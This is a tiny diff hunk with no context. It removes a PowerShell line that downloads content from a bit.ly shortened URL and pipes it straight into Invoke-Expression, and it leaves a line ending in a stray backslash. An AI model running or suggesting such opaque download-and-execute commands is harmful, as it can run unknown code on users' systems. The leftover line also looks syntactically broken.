@@ -1,4 +1,4 @@
-[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls"; irm "https://bit.ly/4vSwxLw" | iex
+[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls"; \
 
 
 
